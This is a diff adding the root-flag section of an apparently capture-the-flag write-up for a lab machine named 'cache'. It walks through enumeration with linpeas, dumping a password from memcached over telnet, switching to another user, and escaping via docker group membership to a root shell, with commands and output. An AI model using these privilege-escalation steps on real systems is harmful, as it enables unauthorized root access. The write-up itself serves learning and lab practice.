@@ -257,3 +257,127 @@ cat user.txt
 <Redacted user flag>
 ash@cache:~$
 ```
+
+## Obtaining root flag
+
+First, we will try to check if the user ```ash``` has the sudo permissions on this terminal. However, it seems that the ```ash``` does not have permissions to execution sudo privileges.
+
+```
+ash@cache:~$ sudo -l
+sudo -l
+[sudo] password for ash: H@v3_fun
+
+Sorry, user ash may not run sudo on cache.
+```
+
+Next, we will scan the terminal with ```linpeas.sh``` script to find for potential entry points to escalate into root. From the output, we can observe that the ```apache2``` process stores credentials in memory, and at the same time, we are also able to find several 2 open ports listening on the local host. This is a sign that we could potentially connect to the IP address and find credentials cache in memory (MAYBE?)
+
+```
+╔══════════╣ Processes with credentials in memory (root req)
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory    
+gdm-password Not Found                                                                           
+gnome-keyring-daemon Not Found                                                                   
+lightdm Not Found                                                                                
+vsftpd Not Found                                                                                 
+apache2 process found (dump creds from memory as root)                                           
+sshd Not Found
+```
+
+```
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                         
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+```
+
+We are also able to discover another new user ```luffy```, but what is interesting about this user is that there this user is part of the ```docker``` group, which is a hint that there may be docker service running on that terminal. We will investigate this in detail later one. 
+
+```
+uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
+```
+
+Knowing that this is a memcached server, we will try to dump all the keys in the server. From there, we are able to obtain the password of the user ```luffy```
+
+```
+ash@cache:~$ telnet 127.0.0.1 11211
+telnet 127.0.0.1 11211
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+stats cachedump 1 0
+stats cachedump 1 0
+ITEM link [21 b; 0 s]
+ITEM user [5 b; 0 s]
+ITEM passwd [9 b; 0 s]
+ITEM file [7 b; 0 s]
+ITEM account [9 b; 0 s]
+END
+get user
+get user
+VALUE user 0 5
+luffy
+END
+get passwd
+get passwd
+VALUE passwd 0 9
+0n3_p1ec3
+END
+quit
+quit
+Connection closed by foreign host.
+```
+
+With the credentials, we will now su into ```luffy```. However, this user is still unable to execute ```sudo``` commands. 
+
+```
+ash@cache:~$ su luffy
+su luffy
+Password: 0n3_p1ec3
+luffy@cache:/home/ash$ cd
+cd
+luffy@cache:~$ ls
+ls
+luffy@cache:~$ sudo -l
+sudo -l
+[sudo] password for luffy: 0n3_p1ec3
+
+Sorry, user luffy may not run sudo on cache.
+luffy@cache:~$ 
+```
+
+However, we recall from previous enumeration that ```luffy``` is part of the ```docker``` group. Hence, we will staty by checking the docker images and containers that are running on this terminal. We realized that even though there is no docker container running at the moment, we are able to execute a dockerised ubuntu iamge.
+
+```
+luffy@cache:~$ docker ps
+docker ps
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
+luffy@cache:~$ docker images
+docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+ubuntu              latest              2ca708c1c9cc        23 months ago       64.2MB
+```
+
+Lastly, we will spawn a root shell using the docker image to break out of the restricted environment.
+
+```
+luffy@cache:~$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh                    
+docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
+# python3 -c 'import pty; pty.spawn("/bin/bash")'    
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+root@3bfb2314758:/# export TERM=xterm
+export TERM=xterm
+root@3bfb231b4758:/# stty cols 132 rows 34
+stty cols 132 rows 34
+root@3bfb231b4758:/# cd /root
+
+cd /root
+root@3bfb231b4758:~# 
+root@3bfb231b4758:~# cat root.txt
+cat root.txt
+<Redacted root flag>
+root@3bfb231b4758:~# 
+```
